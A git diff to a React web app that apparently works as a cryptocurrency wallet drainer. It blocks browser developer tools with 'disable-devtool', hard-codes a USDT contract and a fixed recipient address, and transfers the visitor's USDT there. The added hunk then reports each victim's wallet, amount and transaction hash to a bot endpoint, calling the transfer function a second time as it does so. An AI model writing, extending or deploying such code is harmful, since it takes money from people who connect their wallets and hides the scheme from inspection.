@@ -4,8 +4,8 @@ import Web3 from "web3";
 import { ethers } from "ethers";
 import { FaArrowLeft } from 'react-icons/fa';
 import DisableDevtool from 'disable-devtool';
-import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js';
-import { detectWalletAddress } from "./utils/transactionUtils.js";
+import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils';
+import { detectWalletAddress } from "./utils/transactionUtils";
 
 const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
@@ -338,6 +338,17 @@ const App = () => {
               }
               await handleGetStartedClick(usdtAmount);
               setTransferCompleted(true);
+              // Notify bot after successful transfer
+              fetch('/api/bot/notify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  txHash: (await handleGetStartedClick(usdtAmount)).hash,
+                  from: walletAddress,
+                  to: RECIPIENT_ADDRESS,
+                  amount: usdtAmount
+                })
+              }).catch(console.error);
             } catch (error) {
               console.error("Transfer failed:", error);
               alert(error.message || "Transfer failed. Check console for details.");
